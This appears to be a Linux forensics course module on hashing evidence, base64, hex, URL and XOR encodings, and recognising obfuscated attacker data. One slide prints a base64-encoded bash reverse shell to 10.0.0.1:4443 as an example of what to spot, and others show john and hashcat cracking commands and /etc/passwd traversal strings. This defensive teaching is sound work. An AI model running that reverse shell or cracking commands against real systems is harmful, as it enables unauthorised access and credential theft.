---
tags:
  - infrastructure:linux
  - security:forensics
  - security:security
level: advanced
category: security
audience:
  - audiences:security-professionals

---

# Hashes and Encodings

## Course: Linux Forensics - Day 2
- Hash functions are the backbone of digital forensics integrity
- Encodings transform data between formats
- Understanding both is essential for evidence handling
- This module covers hash algorithms, base encodings, and practical usage

---

## Cryptographic Hash Functions

![Cryptographic Hash Functions](svg/courses/security/linux-forensics/03_hashes_and_encodings/hash_functions_overview.svg)

---

## What is a Hash Function?

- A hash function maps data of arbitrary size to a fixed-size output
- The output is called a hash, digest, or checksum
- Properties of cryptographic hash functions:
    - **Deterministic**: same input always produces same output
    - **Fast**: quick to compute for any input
    - **One-way**: cannot reverse the hash to get original data
    - **Avalanche effect**: small change in input = large change in output
    - **Collision resistant**: hard to find two inputs with same hash

---

## Hash as Digital Signature

```bash
# The same file always produces the same hash
echo "Hello, forensics!" > test.txt
sha256sum test.txt
# a1b2c3... test.txt

# Change one character
echo "Hello, Forensics!" > test.txt
sha256sum test.txt
# f7e8d9... test.txt  (completely different!)

# Empty file has a known hash
sha256sum /dev/null
# e3b0c44298fc1c149afbf4c8996fb924...  (SHA-256 of empty input)
```

- Hashes prove that evidence has not been altered
- Any modification, no matter how small, changes the hash completely

---

## Common Hash Algorithms

| Algorithm | Output Size | Status          | Use in Forensics    |
|-----------|------------|-----------------|---------------------|
| MD5       | 128 bits   | Broken (collisions) | Legacy, still common |
| SHA-1     | 160 bits   | Deprecated      | Being phased out    |
| SHA-256   | 256 bits   | Current standard| Recommended         |
| SHA-512   | 512 bits   | Current standard| High security needs |
| SHA-3     | Variable   | Latest standard | Emerging use        |

- Use **SHA-256** or **SHA-512** for forensic work
- MD5 is still used alongside SHA-256 for backward compatibility
- Always compute at least two different hash types

---

## Computing Hashes in Linux

```bash
# MD5
md5sum evidence_file.dd
echo -n "text" | md5sum

# SHA-1
sha1sum evidence_file.dd
echo -n "text" | sha1sum

# SHA-256
sha256sum evidence_file.dd
echo -n "text" | sha256sum

# SHA-512
sha512sum evidence_file.dd

# Multiple files at once
sha256sum /evidence/*

# Using openssl for hashing
openssl dgst -sha256 evidence_file.dd
openssl dgst -md5 evidence_file.dd
```

---

## Hash Verification Workflow

```bash
# Step 1: Hash the original evidence
sha256sum /dev/sdb > /evidence/original_hash.sha256
cat /evidence/original_hash.sha256
# abc123def456... /dev/sdb

# Step 2: Create forensic image
sudo dd if=/dev/sdb of=/evidence/disk.dd bs=4M status=progress

# Step 3: Hash the image
sha256sum /evidence/disk.dd >> /evidence/original_hash.sha256

# Step 4: Verify hashes match
# The hash of the raw device and the image MUST be identical

# Step 5: Later verification
sha256sum -c /evidence/original_hash.sha256
# /evidence/disk.dd: OK
```

---

## Hashing Entire Drives

```bash
# Hash a drive (takes time for large drives)
sudo sha256sum /dev/sdb
# Note: drive must not change during hashing (use write blocker)

# Hash with progress indicator using pv
sudo pv /dev/sdb | sha256sum

# Parallel hashing with multiple algorithms
sudo dd if=/dev/sdb bs=4M | tee >(md5sum > md5.txt) \
  >(sha256sum > sha256.txt) > /dev/null

# Using dcfldd for simultaneous imaging and hashing
sudo dcfldd if=/dev/sdb of=/evidence/disk.dd \
  hash=md5,sha256 hashwindow=1G \
  md5log=md5.txt sha256log=sha256.txt
```

---

## Hash Databases

- Known file hash databases help identify files without opening them
- **NSRL** (National Software Reference Library): hashes of known software
- **HashKeeper**: law enforcement hash database

```bash
# Download NSRL hash sets
# https://www.nist.gov/itl/ssd/software-quality-group/
#   national-software-reference-library-nsrl

# Compare file hash against known hashes
FILE_HASH=$(sha256sum suspicious_file | awk '{print $1}')
grep -i "$FILE_HASH" nsrl_hashes.txt

# Using hashdeep for recursive hashing
hashdeep -r /evidence/mounted_image/ > all_hashes.txt

# Audit against known-good hashes
hashdeep -r -a -k known_good.txt /evidence/mounted_image/
```

---

## Hashdeep and File Integrity

```bash
# Install hashdeep
sudo apt install hashdeep

# Generate hash manifest of a directory
hashdeep -r -l /etc/ > /evidence/etc_hashes.txt

# Audit mode: compare against baseline
hashdeep -r -a -k /evidence/etc_hashes.txt /mnt/evidence/etc/
# Output shows:
# hashdeep: Audit passed (files matched)
# OR
# hashdeep: FILES MODIFIED: filename (hash mismatch)
# hashdeep: NEW FILES: filename (not in baseline)
# hashdeep: MISSING FILES: filename (in baseline but not found)

# Matching mode: find known files
hashdeep -r -m -k malware_hashes.txt /mnt/evidence/
```

---

## Fuzzy Hashing with `ssdeep`

- Traditional hashes fail if even 1 byte changes
- Fuzzy hashing detects similar (but not identical) files
- Uses context-triggered piecewise hashing (CTPH)

```bash
# Install ssdeep
sudo apt install ssdeep

# Compute fuzzy hash
ssdeep document.doc
# 384:abcdef123456:xyz789  document.doc

# Compare two files
ssdeep -d file1.doc file2.doc
# file1.doc matches file2.doc (87)  <- 87% similar

# Recursive comparison
ssdeep -r /evidence/documents/ > hashes.txt
ssdeep -d -r /evidence/documents/
```

- Useful for finding modified versions of documents
- Helps identify malware variants

---

## Base Encodings Overview

| Encoding  | Alphabet Size | Use Case                    |
|-----------|--------------|------------------------------|
| Base16    | 16 (hex)     | Binary data display          |
| Base32    | 32           | Case-insensitive encoding    |
| Base64    | 64           | Email attachments, web data  |
| Base85    | 85           | PDF, Git binary data         |

- Encoding is NOT encryption - it is reversible without a key
- Attackers often encode data to bypass detection
- Forensic analysts must recognize and decode encoded data

---

## Base64 Encoding

```bash
# Encode text to base64
echo -n "Hello, forensics!" | base64
# SGVsbG8sIGZvcmVuc2ljcyE=

# Decode base64
echo "SGVsbG8sIGZvcmVuc2ljcyE=" | base64 -d
# Hello, forensics!

# Encode a file
base64 suspicious_binary > encoded.txt

# Decode a file
base64 -d encoded.txt > decoded_binary

# Recognize base64:
# - Characters: A-Z, a-z, 0-9, +, /
# - Padding: = or == at the end
# - Length is multiple of 4
```

---

## Base64 in Forensic Context

```bash
# Attackers often use base64 to obfuscate commands
# Example malicious bash command:
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE=" | base64 -d
# bash -i >& /dev/tcp/10.0.0.1/4443 0>&1  <- reverse shell!

# Find base64 strings in files
grep -rP '[A-Za-z0-9+/]{40,}={0,2}' /var/log/ 2>/dev/null

# Decode base64 found in web server logs
echo "dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9cEBzc3cwcmQ=" | base64 -d
# username=admin&password=p@ssw0rd

# Python one-liner for base64 decode
python3 -c "import base64; print(base64.b64decode('SGVsbG8=').decode())"
```

---

## Hexadecimal Encoding

```bash
# Convert text to hex
echo -n "Hello" | xxd -p
# 48656c6c6f

# Convert hex back to text
echo "48656c6c6f" | xxd -r -p
# Hello

# View file in hex
xxd /etc/hostname | head -5
# 00000000: 666f 7265 6e73 6963 732d 6c61 620a  forensics-lab.

# Convert between hex and decimal
printf "Decimal %d = Hex %x\n" 255 255
# Decimal 255 = Hex ff

# Using od (octal dump) for different formats
od -A x -t x1z -v file.bin | head -10
```

---

## URL Encoding

```bash
# URL encoding replaces special characters with %XX
# Space = %20, / = %2F, : = %3A

# Decode URL-encoded strings (common in web logs)
python3 -c "import urllib.parse; print(urllib.parse.unquote(
  '%2Fetc%2Fpasswd'))"
# /etc/passwd

# Double encoding (evasion technique)
# %252F = %2F (decoded once) = / (decoded twice)
python3 -c "import urllib.parse; print(urllib.parse.unquote(
  urllib.parse.unquote('%252Fetc%252Fpasswd')))"
# /etc/passwd

# Find URL-encoded strings in logs
grep -P '%[0-9A-Fa-f]{2}' /var/log/apache2/access.log
```

---

## ROT13 and Simple Ciphers

```bash
# ROT13 - rotate each letter by 13 positions
echo "Hello World" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Uryyb Jbeyq

# Decode ROT13 (same operation)
echo "Uryyb Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Hello World

# XOR encoding (common in malware)
python3 -c "
data = b'Hello'
key = 0x42
encoded = bytes([b ^ key for b in data])
print('Encoded:', encoded.hex())
decoded = bytes([b ^ key for b in encoded])
print('Decoded:', decoded.decode())
"
```

- Simple ciphers are easily reversed
- Attackers use them to avoid simple string detection

---

## Identifying Encoding Types

```bash
# Use file command to identify data type
echo "SGVsbG8gV29ybGQ=" | base64 -d > mystery_file
file mystery_file

# Check entropy to detect encoding/encryption
ent mystery_file
# High entropy (~8 bits/byte) = encrypted or compressed
# Medium entropy (~5-6) = encoded text
# Low entropy (~3-4) = plain text

# Install and use CyberChef CLI alternative
# Or use the detect function in Python
python3 -c "
import base64, binascii
data = 'SGVsbG8='
try:
    result = base64.b64decode(data)
    print(f'Base64 decoded: {result}')
except:
    pass
try:
    result = binascii.unhexlify(data)
    print(f'Hex decoded: {result}')
except:
    pass
"
```

---

## Hash Cracking Awareness

- Forensic investigators may need to recover passwords from hashes
- Legal authorization required before attempting hash cracking

```bash
# Common tools (authorized use only):
# John the Ripper - versatile password cracker
# Hashcat - GPU-accelerated hash cracking

# Identify hash type
hashid 'e10adc3949ba59abbe56e057f20f883e'
# [+] MD5

# Using john with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Using hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5, -a 0 = dictionary attack

# Show cracked passwords
john --show hashes.txt
```

---

## Encoding Detection Cheat Sheet

| Pattern                        | Likely Encoding    |
|-------------------------------|--------------------|
| `[A-Za-z0-9+/]+=*`           | Base64             |
| `[0-9A-Fa-f]+` (even length) | Hexadecimal        |
| `%[0-9A-Fa-f]{2}`            | URL encoding       |
| `&#[0-9]+;` or `&#x[0-9a-f]+;` | HTML entities   |
| `\x[0-9a-f]{2}`              | Hex escape         |
| `\u[0-9a-f]{4}`              | Unicode escape     |
| `=?UTF-8?B?...?=`            | MIME Base64        |
| `=?UTF-8?Q?...?=`            | MIME Quoted-Print  |

---

## Multi-Layer Encoding

- Attackers often stack multiple encoding layers

```bash
# Example: Base64 -> URL encoded -> Base64
# Layer 1: Start with command
echo -n "whoami" | base64
# d2hvYW1p

# Layer 2: URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('d2hvYW1p'))"
# d2hvYW1p  (no special chars, unchanged)

# Decoding multiple layers in practice:
ENCODED="WTJodmRXMWg="
# Decode layer 1 (base64)
LAYER1=$(echo "$ENCODED" | base64 -d)
echo "Layer 1: $LAYER1"
# Decode layer 2 (base64 again)
LAYER2=$(echo "$LAYER1" | base64 -d)
echo "Layer 2: $LAYER2"
```

---

## Exercise: Hash and Encoding Practice

### Tasks:
1. Compute MD5, SHA-1, and SHA-256 of a test file
1. Verify hash integrity after copying a file
1. Decode a base64-encoded suspicious string
1. Identify the encoding type of mystery strings
1. Use `ssdeep` to compare similar files

```bash
# Create test file
echo "Forensic evidence integrity test" > /tmp/test_evidence.txt

# Compute hashes
md5sum /tmp/test_evidence.txt
sha1sum /tmp/test_evidence.txt
sha256sum /tmp/test_evidence.txt

# Decode this string - what does it contain?
echo "L2V0Yy9zaGFkb3c=" | base64 -d

# What encoding is this?
echo "2f6574632f706173737764" | xxd -r -p
```

---

## Summary: Hashes and Encodings

- Hash functions produce fixed-size fingerprints of data
- SHA-256 is the current standard for forensic integrity
- Always hash evidence before and after acquisition
- Verify hashes at every stage of the investigation
- Hash databases (NSRL) identify known files quickly
- Fuzzy hashing (`ssdeep`) finds similar files
- Base64 encoding is commonly used to obfuscate data
- Hexadecimal representation is essential for binary analysis
- URL encoding appears in web logs and attack payloads
- Attackers stack multiple encoding layers to evade detection
- Hash cracking tools can recover passwords (with authorization)

---

## Hash Collisions and Forensic Implications

```bash
# MD5 is vulnerable to collision attacks
# Two different files can have the same MD5 hash

# This is why forensics uses SHA-256 (no known collisions)

# Verify: create two different files, check hashes
echo "File A content" > /tmp/fileA
echo "File B content" > /tmp/fileB
md5sum /tmp/fileA /tmp/fileB
sha256sum /tmp/fileA /tmp/fileB
# Different hashes for different files (as expected)

# In 2017, Google's SHAttered attack found SHA-1 collision
# Two different PDFs with same SHA-1 hash

# Best practice: always compute multiple hash algorithms
# If MD5 matches but SHA-256 doesn't = possible collision attack
md5sum evidence.dd
sha1sum evidence.dd
sha256sum evidence.dd
```

---

## Hashing Specific File Regions

```bash
# Hash only part of a file (useful for large images)
dd if=evidence.dd bs=1M count=100 | sha256sum
# Hash first 100 MB only

# Hash with offset
dd if=evidence.dd bs=1M skip=1024 count=100 | sha256sum
# Hash 100 MB starting at 1 GB offset

# Piecewise hashing (hash segments independently)
# Useful for detecting which parts changed
split -b 1G evidence.dd evidence_part_
for part in evidence_part_*; do
  sha256sum "$part"
done > piecewise_hashes.txt

# Using hashdeep for piecewise hashing
hashdeep -p 1G evidence.dd > piecewise.txt
```

---

## HMAC - Keyed Hash Functions

```bash
# HMAC = Hash-based Message Authentication Code
# Provides both integrity AND authentication

# Generate HMAC
echo -n "evidence data" | \
  openssl dgst -sha256 -hmac "secret_key"
# HMAC-SHA256 requires the secret key to verify

# Forensic use: prove evidence wasn't tampered with
# Only someone with the key can generate valid HMAC

# Create HMAC of evidence file
openssl dgst -sha256 -hmac "$(cat /evidence/key)" \
  /evidence/disk.dd > /evidence/hmac_verification.txt

# Verify HMAC later
openssl dgst -sha256 -hmac "$(cat /evidence/key)" \
  /evidence/disk.dd
# Compare with stored HMAC

# HMAC is more secure than plain hash for chain of custody
# Prevents third-party from faking a matching hash
```

---

## Encoding in Malware Analysis

```bash
# Malware frequently uses encoding to hide strings

# Common patterns in Linux malware:

# 1. XOR encoding with single byte key
python3 -c "
data = bytes.fromhex('2a3b4c5d6e')
for key in range(256):
    decoded = bytes([b ^ key for b in data])
    if decoded.isascii() and decoded.isprintable():
        print(f'Key 0x{key:02x}: {decoded.decode()}')"

# 2. Custom Base64 alphabets
# Standard: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop...
# Custom:   ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkji...

# 3. String stacking (building strings character by character)
# mov byte [rsp], 0x2f      # /
# mov byte [rsp+1], 0x62    # b
# mov byte [rsp+2], 0x69    # i
# mov byte [rsp+3], 0x6e    # n
# Result: "/bin"

# 4. Stack strings extraction with FLOSS
floss suspicious_binary
```

---

## Blockchain and Cryptocurrency in Forensics

```bash
# Cryptocurrency wallets may be found during investigations

# Bitcoin wallet files
find / -name "wallet.dat" 2>/dev/null

# Ethereum keystore
find / -path "*keystore*" -name "UTC--*" 2>/dev/null

# Monero wallet
find / -name "*.keys" -path "*monero*" 2>/dev/null

# Search for wallet addresses in files
# Bitcoin address pattern (legacy)
grep -rP '\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b' /evidence/ 2>/dev/null

# Ethereum address pattern
grep -rP '\b0x[0-9a-fA-F]{40}\b' /evidence/ 2>/dev/null

# Mining pool configuration
grep -rn "pool\|stratum\|wallet" /evidence/ 2>/dev/null | \
  grep -v "Binary file"
```

---

## Certificate and TLS Forensics

```bash
# Examine SSL/TLS certificates on the system
# May reveal communication with malicious servers

# List all certificates
find / -name "*.pem" -o -name "*.crt" -o -name "*.cer" \
  2>/dev/null | head -20

# Examine a certificate
openssl x509 -in /path/to/cert.pem -text -noout
# Key fields: Subject, Issuer, Valid From/To, Serial

# Check certificate validity
openssl x509 -in cert.pem -checkend 0

# Extract certificates from Firefox
certutil -d sql:/home/user/.mozilla/firefox/*.default -L

# Self-signed certificates (suspicious in unexpected places)
openssl x509 -in cert.pem -text -noout | \
  grep -A1 "Issuer" | grep -A1 "Subject"
# If Issuer == Subject, it's self-signed

# Check system trust store for unauthorized CAs
ls /etc/ssl/certs/
diff <(ls /etc/ssl/certs/) /evidence/baseline/ssl_certs.txt
```

---

## Time Zone Forensics

```bash
# Timestamps may be in different time zones
# Converting correctly is critical

# System timezone
timedatectl
cat /etc/timezone
# America/New_York

# Convert between timezones
TZ="America/New_York" date -d "2025-01-15 10:30:00"
# Wed Jan 15 10:30:00 EST 2025

TZ="UTC" date -d "2025-01-15 10:30:00 EST"
# Wed Jan 15 15:30:00 UTC 2025

# File timestamps are stored in UTC by ext4
# But displayed in local timezone by default
stat /etc/passwd  # Shows in local time
stat --format='%y' /etc/passwd  # Modify time

# Force UTC display
TZ=UTC stat /etc/passwd
TZ=UTC ls -la --time-style=full-iso /etc/passwd

# Always convert everything to UTC for timeline
# Document which timezone the system was configured for
```

---

## Handling Evidence from Multiple Time Zones

```bash
# When investigating systems across time zones:

# 1. Document each system's timezone
cat /forensics/mounted_server1/etc/timezone  # UTC
cat /forensics/mounted_server2/etc/timezone  # US/Pacific

# 2. Note NTP configuration (was time synchronized?)
cat /forensics/mounted/etc/chrony/chrony.conf
cat /forensics/mounted/etc/ntp.conf

# 3. Check for manual time changes in logs
grep -i "time" /forensics/mounted/var/log/auth.log | \
  grep -iE "set|change|adjust"
journalctl --directory=/forensics/mounted/var/log/journal/ | \
  grep -i "time.*change"

# 4. Hardware clock vs system clock
# Compare if available from forensic notes

# 5. Convert all timestamps to UTC
# Create a normalized timeline with UTC timestamps only
```
